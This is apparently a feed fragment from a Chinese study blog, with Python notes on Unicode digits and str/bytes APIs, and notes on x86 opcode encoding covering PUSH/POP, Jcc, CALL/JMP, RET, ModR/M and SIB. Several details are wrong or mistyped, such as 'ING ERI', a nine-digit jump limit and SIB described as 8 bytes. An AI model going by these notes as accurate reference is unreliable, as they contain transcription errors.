class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> unicodedata<br><span class="hljs-keyword">import</span> re<br>re_digit = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\d&#x27;</span>)<br>sample = <span class="hljs-string">&#x27;1\xbc\xb2\u0969\u136b\u216b\u2466\u2480\u3285&#x27;</span><br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> sample:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;U+%04x&#x27;</span> % <span class="hljs-built_in">ord</span>(char), <br>        char.center(<span class="hljs-number">6</span>), <br>        <span class="hljs-string">&#x27;re_dig&#x27;</span> <span class="hljs-keyword">if</span> re_digit.match(char) <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;-&#x27;</span>, <br>        <span class="hljs-string">&#x27;isdig&#x27;</span> <span class="hljs-keyword">if</span> char.isdigit() <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;-&#x27;</span>, <br>        <span class="hljs-string">&#x27;isnum&#x27;</span> <span class="hljs-keyword">if</span> char.isnumeric() <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;-&#x27;</span>, <br>        <span class="hljs-built_in">format</span>(unicodedata.numeric(char), <span class="hljs-string">&#x27;5.2f&#x27;</span>), <br>        unicodedata.name(char), <br>        sep=<span class="hljs-string">&#x27;\t&#x27;</span>)<br>➊ U+<span class="hljs-number">0000</span> 格式的码位。<br>➋ 在长度为 <span class="hljs-number">6</span> 的字符串中居中显示字符。<br>➌ 如果字符匹配正则表达式 <span class="hljs-string">r&#x27;\d&#x27;</span>，显示 re_dig。<br>➍ 如果 char.isdigit() 返回 <span class="hljs-literal">True</span>，显示 isdig。<br>➎ 如果 char.isnumeric() 返回 <span class="hljs-literal">True</span>，显示 isnum。<br>➏ 使用长度为 <span class="hljs-number">5</span>、小数点后保留 <span class="hljs-number">2</span> 位的浮点数显示数值。<br>➐ Unicode 标准中字符的名称。<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">U+00b2    ²     -       isdig   isnum    2.00   SUPERSCRIPT TWO       </span><br><span class="hljs-string">U+0969    ३     re_dig  isdig   isnum    3.00   DEVANAGARI DIGIT THREEU+136b    ፫     -       isdig   isnum    3.00   ETHIOPIC DIGIT THREE  </span><br><span class="hljs-string">U+216b    Ⅻ     -       -       isnum   12.00   ROMAN NUMERAL TWELVE  </span><br><span class="hljs-string">U+2466    ⑦     -       isdig   isnum    7.00   CIRCLED DIGIT SEVEN   </span><br><span class="hljs-string">U+2480    ⒀     -       -       isnum   13.00   PARENTHESIZED NUMBER THIRTEENU+3285    ㊅    -       -       isnum    6.00   CIRCLED IDEOGRAPH SIX </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><h1 id="49-支持字符串和字节序列的双模式api"><a class="markdownIt-Anchor" href="#49-支持字符串和字节序列的双模式api"></a> 4.9 支持字符串和字节序列的双模式API</h1><p>标准库中的一些函数能接受字符串或字节序列为参数，然后根据类型展 现不同的行为。re 和 os 模块中就有这样的函数。</p><h2 id="491-正则表达式中的字符串和字节序列"><a class="markdownIt-Anchor" href="#491-正则表达式中的字符串和字节序列"></a> 4.9.1 正则表达式中的字符串和字节序列</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#4.9</span><br><span class="hljs-keyword">import</span> re<br>re_number_str = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\d+&#x27;</span>)<br>re_word_str = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\w+&#x27;</span>)<br>re_numbers_bytes = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">rb&#x27;\d+&#x27;</span>)<br>re_words_bytes = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">rb&#x27;\w+&#x27;</span>)<br><br>text_str = (<span class="hljs-string">&quot;Ramanujan saw \u0be7\u0bed\u0be8\u0bef&quot;</span> <br><span class="hljs-string">&quot; as 1729 = 1³ + 12³ = 9³ + 10³.&quot;</span>) <br><br>text_bytes = text_str.encode(<span class="hljs-string">&#x27;utf_8&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Text&#x27;</span>, <span class="hljs-built_in">repr</span>(text_str), sep=<span class="hljs-string">&#x27;\n &#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Numbers&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; str :&#x27;</span>, re_number_str.findall(text_str)) <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; bytes:&#x27;</span>, re_numbers_bytes.findall(text_bytes)) <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Words&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; str :&#x27;</span>, re_word_str.findall(text_str)) <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; bytes:&#x27;</span>, re_words_bytes.findall(text_bytes)) <br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"> str : [&#x27;௧௭௨௯&#x27;, &#x27;1729&#x27;, &#x27;1&#x27;, &#x27;12&#x27;, &#x27;9&#x27;, &#x27;10&#x27;]</span><br><span class="hljs-string"> bytes: [b&#x27;1729&#x27;, b&#x27;1&#x27;, b&#x27;12&#x27;, b&#x27;9&#x27;, b&#x27;10&#x27;]</span><br><span class="hljs-string">Words</span><br><span class="hljs-string"> str : [&#x27;Ramanujan&#x27;, &#x27;saw&#x27;, &#x27;௧௭௨௯&#x27;, &#x27;as&#x27;, &#x27;1729&#x27;, &#x27;1³&#x27;, &#x27;12³&#x27;, &#x27;9³&#x27;, &#x27;10³&#x27;]</span><br><span class="hljs-string"> bytes: [b&#x27;Ramanujan&#x27;, b&#x27;saw&#x27;, b&#x27;as&#x27;, b&#x27;1729&#x27;, b&#x27;1&#x27;, b&#x27;12&#x27;, b&#x27;9&#x27;, b&#x27;10&#x27;]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"> 字符串模式 r&#x27;\d+&#x27; 能匹配泰米尔数字和 ASCII 数字。</span><br><span class="hljs-string"> 字节序列模式 rb&#x27;\d+&#x27; 只能匹配 ASCII 字节中的数字。</span><br><span class="hljs-string"> 字符串模式 r&#x27;\w+&#x27; 能匹配字母、上标、泰米尔数字和 ASCII 数字。</span><br><span class="hljs-string"> 字节序列模式 rb&#x27;\w+&#x27; 只能匹配 ASCII 字节中的字母和数字。</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="492-os函数中的字符串和字节序列跳"><a class="markdownIt-Anchor" href="#492-os函数中的字符串和字节序列跳"></a> 4.9.2 os函数中的字符串和字节序列（跳）</h2><p>GNU/Linux 内核不理解 Unicode，因此你可能发现了，对任何合理的编 码方案来说，在文件名中使用字节序列都是无效的，无法解码成字符 串。在不同操作系统中使用各种客户端的文件服务器，在遇到这个问题 时尤其容易出错。 为了规避这个问题，<strong>os 模块中的所有函数、文件名或路径名参数既能 使用字符串，也能使用字节序列。如果这样的函数使用字符串参数调 用，该参数会使用 sys.getfilesystemencoding() 得到的编解码器 自动编码，然后操作系统会使用相同的编解码器解码</strong>。这几乎就是我们 想要的行为，与 Unicode 三明治最佳实践一致。 但是，如果必须处理（也可能是修正）那些无法使用上述方式自动处理 的文件名，可以把字节序列参数传给 os 模块中的函数，得到字节序列 返回值。这一特性允许我们处理任何文件名或路径名，不管里面有多少 鬼符</p><img src="/2022/04/13/python%E5%AD%A6%E4%B9%A0-4/image-20220329231114828.png" alt="image-20220329231114828" style="zoom:50%;"><p><strong>fsencode(filename)</strong></p><p>如果 filename 是 str 类型（此外还可能是 bytes 类型），使用 sys.getfilesystemencoding() 返回的编解码器把 filename 编码成 字节序列；否则，返回未经修改的 filename 字节序列。</p><p><strong>fsdecode(filename)</strong></p><p>如果 filename 是 bytes 类型（此外还可能是 str 类型），使用 sys.getfilesystemencoding() 返回的编解码器把 filename 解码成 字符串；否则，返回未经修改的 filename 字符串。 在 Unix 衍生平台中，这些函数使用 surrogateescape 错误处理方式 （参见下述附注栏）以避免遇到意外字节序列时卡住。Windows 使用的 错误处理方式是 strict。</p><img src="/2022/04/13/python%E5%AD%A6%E4%B9%A0-4/image-20220329231425423.png" alt="image-20220329231425423" style="zoom:67%;">]]></content>
    
    
    <categories>
      
      <category>python学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>硬编码学习</title>
    <link href="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="1定长指令"><a class="markdownIt-Anchor" href="#1定长指令"></a> 1.定长指令</h1><p>由opcode就可以知道这个指令的字节？</p><p>32位寄存器及其主要功能</p><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220320151101303.png" alt="image-20220320151101303" style="zoom:50%;"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//32位，一个字节</span><br><span class="hljs-comment">//PUSH，POP</span><br><span class="hljs-number">50</span> PUSH EAX<br><span class="hljs-number">51</span> PUSH ECX<br><span class="hljs-number">52</span> PUSH EDX<br><span class="hljs-number">53</span> PUSH EBX<br><span class="hljs-number">54</span> PUSH ESP<br><span class="hljs-number">55</span> PUSH EBP<br><span class="hljs-number">56</span> PUSH ESI<br><span class="hljs-number">57</span> PUSH EDI<br><span class="hljs-number">58</span> POP EAX<br><span class="hljs-number">59</span> POP ECX<br><span class="hljs-number">5</span>A POP EDX<br><span class="hljs-number">5B</span> POP EBX<br><span class="hljs-number">5</span>C POP ESP<br><span class="hljs-number">5</span>D POP EBP<br><span class="hljs-number">5</span>E POP ESI<br><span class="hljs-number">5F</span> POP EDI<br><span class="hljs-comment">//INC 操作数加1</span><br><span class="hljs-number">40</span> INC EA:<br><span class="hljs-number">41</span> INC ECX<br><span class="hljs-number">42</span> INC EDX<br><span class="hljs-number">43</span> INC EBX<br><span class="hljs-number">44</span> INC ESP<br><span class="hljs-number">45</span> INC EBP<br><span class="hljs-number">46</span> INC ESI<br><span class="hljs-number">47</span> ING ERI<br><span class="hljs-comment">//DEC 操作数减1</span><br><span class="hljs-number">48</span> DEC EAX<br><span class="hljs-number">49</span> DEC ECX<br><span class="hljs-number">4</span>A DEC EDX<br><span class="hljs-number">4B</span> DEC EBX<br><span class="hljs-number">4</span>C DEC ESP<br><span class="hljs-number">4</span>D DEC EBP<br><span class="hljs-number">4</span>E DEC ESI<br><span class="hljs-number">4F</span> DEC EDI<br><br></code></pre></td></tr></table></figure><h2 id="b0-b891-97"><a class="markdownIt-Anchor" href="#b0-b891-97"></a> B0-B8,91-97</h2><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220320151933166.png" alt="image-20220320151933166" style="zoom:50%;"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++">B0 立即数 mov AL 立即数<br>B7 立即数 mov BH 立即数<br><span class="hljs-comment">//b0到b7是把立即数送到8位寄存器里al-bh</span><br>B8 立即数 mov EAX 立即数<br><span class="hljs-comment">//b8 - bf 把立即数送到32位寄存器里</span><br><span class="hljs-number">91</span> XCHG EAX ECX<br><span class="hljs-number">92</span> XCHG EAX EDX<br>....<br><span class="hljs-comment">//91-97 XCHG EAX 32位寄存器（ECX-EDI），交换2个寄存器的值，90=NOP</span><br><br></code></pre></td></tr></table></figure><h2 id="70-7f"><a class="markdownIt-Anchor" href="#70-7f"></a> 70-7F</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//一般2字节，后面跟立即数 </span><br><span class="hljs-number">70</span> JO <span class="hljs-comment">//o标志位为1时跳转</span><br><span class="hljs-comment">//例,后面跟的数可以是有符号的</span><br><span class="hljs-number">70</span> <span class="hljs-number">6</span>A <span class="hljs-comment">//6A&lt;7F -&gt;地址往后跳6A(以这个数的地址为基础)</span><br><span class="hljs-number">70</span> <span class="hljs-number">8B</span> <span class="hljs-comment">//8B&gt;7F -&gt;往前跳</span><br><span class="hljs-comment">//如果条件成立，跳转到 当前指令地址 + 当前指令长度 + Ib（1个字节立即数）</span><br><span class="hljs-comment">//jcc Jb = 要跳转的地址 - 下一条指令的地址 = 要跳转的地址 - (当前指令地址 + 当前指令长度)</span><br>    <span class="hljs-number">0x70</span>  JOOF=<span class="hljs-number">1</span><br>    <span class="hljs-number">0x71</span>JNOOF=<span class="hljs-number">0</span><br>    <span class="hljs-number">0x72</span>JB/JNAE/JCCF=<span class="hljs-number">1</span><br>    <span class="hljs-number">0x73</span>JNB/JAE/JNCCF=<span class="hljs-number">0</span><br>    <span class="hljs-number">0x74</span>JZ/JEZF=<span class="hljs-number">1</span><br>    <span class="hljs-number">0x75</span>JNZ/JNEZF=<span class="hljs-number">0</span><br>    <span class="hljs-number">0x76</span>JBE/JNAZF=<span class="hljs-number">1</span>或者CF=<span class="hljs-number">1</span><br>    <span class="hljs-number">0x77</span>JNBE/JAZF=<span class="hljs-number">0</span>或者CF=<span class="hljs-number">0</span><br>    <span class="hljs-number">0x78</span>JSSF=<span class="hljs-number">1</span><br>    <span class="hljs-number">0x79</span>JNSSF=<span class="hljs-number">0</span><br>    <span class="hljs-number">0x7A</span>JP/JPEPF=<span class="hljs-number">1</span><br>    <span class="hljs-number">0x7B</span>JNP/JPOPF=<span class="hljs-number">0</span><br>    <span class="hljs-number">0x7C</span>JL/JNGESF!=OF<br>    <span class="hljs-number">0x7D</span>JNL/JGESF=OF<br>    <span class="hljs-number">0x7E</span>JLE/JNGZF!=OF 或 ZF=<span class="hljs-number">1</span><br>    <span class="hljs-number">0x7F</span>JNLE/JGZF!OF 或 ZF=<span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220320224916256.png" alt="image-20220320224916256" style="zoom:50%;"><p><strong>8B是有符号数，二进制位1000 1011 = -117（十六进制75），所以</strong></p><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220320232939952.png" alt="image-20220320232939952" style="zoom:50%;"><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220320232651832.png" alt="image-20220320232651832" style="zoom:50%;"><p><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220320180029381.png" alt="image-20220320180029381"></p><h2 id="0f-80-0f-8f"><a class="markdownIt-Anchor" href="#0f-80-0f-8f"></a> 0F 80 - 0F 8F</h2><p>条件跳转，后跟四个字节立即数的偏移(有符号)，<strong>共五个字节。</strong><br>如果条件成立，跳转到 当前指令地址 + 当前指令长度 + Id（四字节）<br>最大值：向前跳7FFFFFFFF，向后跳80000000</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><br><span class="hljs-number">0x0F</span> <span class="hljs-number">0x80</span>  JO<br><span class="hljs-number">0x0F</span> <span class="hljs-number">0x81</span>JNO<br><span class="hljs-number">0x0F</span> <span class="hljs-number">0x82</span>JB/JNAE/JC<br><span class="hljs-number">0x0F</span> <span class="hljs-number">0x83</span>JNB/JAE/JNC<br><span class="hljs-number">0x0F</span> <span class="hljs-number">0x84</span>JZ/JE<br><span class="hljs-number">0x0F</span> <span class="hljs-number">0x85</span>JNZ/JNE<br><span class="hljs-number">0x0F</span> <span class="hljs-number">0x86</span>JBE/JNA<br><span class="hljs-number">0x0F</span> <span class="hljs-number">0x87</span>JNBE/JA<br><span class="hljs-number">0x0F</span> <span class="hljs-number">0x88</span>JS<br><span class="hljs-number">0x0F</span> <span class="hljs-number">0x89</span>JNS<br><span class="hljs-number">0x0F</span> <span class="hljs-number">0x8A</span>JP/JPE<br><span class="hljs-number">0x0F</span> <span class="hljs-number">0x8B</span>JNP/JPO<br><span class="hljs-number">0x0F</span> <span class="hljs-number">0x8C</span>JL/JNGE<br><span class="hljs-number">0x0F</span> <span class="hljs-number">0x8D</span>JNL/JGE<br><span class="hljs-number">0x0F</span> <span class="hljs-number">0x8E</span>JLE/JNG<br><span class="hljs-number">0x0F</span> <span class="hljs-number">0x8F</span>JNLE/JG<br><br><br></code></pre></td></tr></table></figure><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220321231116886.png" alt="image-20220321231116886" style="zoom:80%;"><h2 id="e0-e9"><a class="markdownIt-Anchor" href="#e0-e9"></a> E0 - E9</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0xE0</span>  <span class="hljs-keyword">LOOPNE</span>/<span class="hljs-keyword">LOOPNZ</span> Ib (<span class="hljs-keyword">Jb</span>)共<span class="hljs-number">2</span>字节<br><span class="hljs-built_in">ECX</span> = <span class="hljs-built_in">ECX</span> - <span class="hljs-number">1</span>  当ZF = <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">ECX</span>!=<span class="hljs-number">0</span> 时跳转到 当前指令地址 + 当前指令长度 + Ib <br><br><span class="hljs-number">0XE1</span>     <span class="hljs-keyword">LOOPE</span>/<span class="hljs-keyword">LOOPZ</span> Ib (<span class="hljs-keyword">Jb</span>)共<span class="hljs-number">2</span>字节<br><span class="hljs-built_in">ECX</span> = <span class="hljs-built_in">ECX</span> - <span class="hljs-number">1</span>  当ZF = <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-built_in">ECX</span> != <span class="hljs-number">0</span> 时跳转到 当前指令地址 + 当前指令长度 + Ib<br><br><span class="hljs-number">0XE2</span><span class="hljs-keyword">LOOP</span> Ib (<span class="hljs-keyword">Jb</span>)共<span class="hljs-number">2</span>字节<br><span class="hljs-built_in">ECX</span> = <span class="hljs-built_in">ECX</span> - <span class="hljs-number">1</span>  当 <span class="hljs-built_in">ECX</span>!=<span class="hljs-number">0</span> 时跳转到 当前指令地址 + 当前指令长度 + Ib<br>    <br><span class="hljs-number">0XE3</span><span class="hljs-keyword">JrCXZ</span> Ib (<span class="hljs-keyword">Jb</span>) (在<span class="hljs-number">32</span>位模式中,<span class="hljs-built_in">rCX</span>为<span class="hljs-built_in">ECX</span>)共<span class="hljs-number">2</span>字节<br>当 <span class="hljs-built_in">ECX</span> = <span class="hljs-number">0</span> 时跳转到 当前指令地址 + 当前指令长度 + Ib<br>(自己控制步长)<br><br><span class="hljs-number">0xE8</span><span class="hljs-keyword">CALL</span> Id (Jd)  共<span class="hljs-number">5</span>字节<br><span class="hljs-keyword">CALL</span>指令的下一条指令地址入栈后，跳转到 当前指令地址 + 当前指令长度 + Id<br><br><span class="hljs-number">0xE9</span><span class="hljs-keyword">JMP</span> Id (Jd)共<span class="hljs-number">5</span>字节<br>跳转到 当前指令地址 + 当前指令长度 + Id<br><br><span class="hljs-number">0xEA</span><span class="hljs-keyword">JMP</span> Ap （Ap：六字节长度的直接地址）跨段跳转，共<span class="hljs-number">7</span>字节<br><span class="hljs-keyword">JMP</span> <span class="hljs-built_in">CS</span>:Id  将Ap中的高<span class="hljs-number">2</span>位赋值给<span class="hljs-built_in">CS</span>，低<span class="hljs-number">4</span>位直接赋值给<span class="hljs-built_in">EIP</span>， 即跳转<br><br>004183D7 &gt;    EA <span class="hljs-number">12345678</span> 1B00     <span class="hljs-keyword">JMP</span> <span class="hljs-built_in">FAR</span> <span class="hljs-number">001B</span>:<span class="hljs-number">78563412</span><br><br><span class="hljs-number">0xEB</span><span class="hljs-keyword">JMP</span> Ib (<span class="hljs-keyword">Jb</span>)<br>跳转到 当前指令地址 + 当前指令长度 + Ib(一个字节)<br><br><br></code></pre></td></tr></table></figure><h2 id="c"><a class="markdownIt-Anchor" href="#c"></a> C</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0xC3</span> <span class="hljs-keyword">RET</span>共<span class="hljs-number">1</span>字节<br><span class="hljs-built_in">EIP</span>出栈<br><br><span class="hljs-number">0xC2</span><span class="hljs-keyword">RET</span> Iw共<span class="hljs-number">3</span>字节<span class="hljs-keyword">ret</span> <span class="hljs-number">4</span> = <span class="hljs-keyword">pop</span> <span class="hljs-built_in">eip</span> <span class="hljs-built_in">esp</span>+<span class="hljs-number">4</span><br><span class="hljs-built_in">EIP</span>出栈后，<span class="hljs-built_in">ESP</span> = <span class="hljs-built_in">ESP</span> + Iw<br><br><span class="hljs-number">0XCB</span><span class="hljs-keyword">RETF</span> （return <span class="hljs-built_in">far</span>） 共<span class="hljs-number">1</span>字节<br>出栈<span class="hljs-number">8</span>个字节，低<span class="hljs-number">4</span>个字节赋值给<span class="hljs-built_in">EIP</span>,高<span class="hljs-number">4</span>个字节中低<span class="hljs-number">2</span>位赋值给<span class="hljs-built_in">CS</span> <br><br><span class="hljs-number">0xCA</span><span class="hljs-keyword">RETF</span> Iw共<span class="hljs-number">3</span>字节<br>出栈<span class="hljs-number">8</span>个字节，低<span class="hljs-number">4</span>个字节赋值给<span class="hljs-built_in">EIP</span>,高<span class="hljs-number">4</span>个字节中低<span class="hljs-number">2</span>位赋值给<span class="hljs-built_in">CS</span>后，<span class="hljs-built_in">ESP</span> = <span class="hljs-built_in">ESP</span> + Iw <br>    <br><span class="hljs-keyword">ret</span>  -&gt; <span class="hljs-keyword">pop</span> <span class="hljs-built_in">eip</span><br><span class="hljs-keyword">retf</span> -&gt; <span class="hljs-keyword">pop</span> <span class="hljs-built_in">eip</span>, <span class="hljs-keyword">pop</span> <span class="hljs-built_in">cs</span><br><br><br></code></pre></td></tr></table></figure><h1 id="2变长"><a class="markdownIt-Anchor" href="#2变长"></a> 2.变长</h1><h2 id="88-8b-mov"><a class="markdownIt-Anchor" href="#88-8b-mov"></a> 88 -8B MOV</h2><p>opcode决定后面的，像下列指令，就肯定有ModR/M字段</p><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220322231038735.png" alt="image-20220322231038735" style="zoom:80%;"><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">经典变长指令_ModR/M<br><br><span class="hljs-number">0x88</span>  <span class="hljs-keyword">MOV</span> Eb, GbG：通用寄存器<br><span class="hljs-number">0x89</span><span class="hljs-keyword">MOV</span> Ev, GvE：寄存器/内存  看mod的值 <span class="hljs-number">00</span>，<span class="hljs-number">01</span>，<span class="hljs-number">10</span>是内存，<span class="hljs-number">11</span>是寄存器<br><span class="hljs-number">0x8A</span><span class="hljs-keyword">MOV</span> Gb, Ebb：字节  //这里后面有b说明看的是八位寄存器<br><span class="hljs-number">0x8B</span><span class="hljs-keyword">MOV</span> Gv, Evv：<span class="hljs-built_in">Word</span>, doubleword <span class="hljs-keyword">or</span> quadword//取决当前<span class="hljs-meta">cpu</span>模式<br><br></code></pre></td></tr></table></figure><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220322231748759.png" alt="image-20220322231748759" style="zoom:67%;"><p>例如 MOV Eb, Gb  中3，4，5位决定G（通用寄存器），6，7和0-2位决定E</p><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220322232404169.png" alt="image-20220322232404169" style="zoom:67%;"><p>主要是查这个表</p><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220322232833542.png" alt="image-20220322232833542" style="zoom:67%;"><p>mod是100时理论上是esp，ebp，但是实际是没这个指令的，改成别的意义了</p><p>练习：</p><p>88 84 = MOV Eb Gb  84 = 10 000 100</p><p>000 表示G = 1号8位寄存器 = AL</p><p>10 = xx+disp32(32位的偏移)  xx根据100决定</p><p>所以这个指令是 MOV byte ptr ds:[xx+32位偏移]  ,al</p><p>不过xx是100，情况特殊，这就是接下来的指令</p><p>opcode决定modrm，modrm决定后面有没有SIB</p><p>所以字节低位是4的就有SIB</p><h2 id="sib字段"><a class="markdownIt-Anchor" href="#sib字段"></a> SIB字段</h2><p><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220324002710075.png" alt="image-20220324002710075"></p><p>当modRM为以上情况时，后续会有SIB字段，8个字节，被分成3个字段,这里disp32指32位的地址偏移，disp8同理</p><p><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220324003541893.png" alt="image-20220324003541893"></p><p>例如， DS:[EAX + ECX*2 + 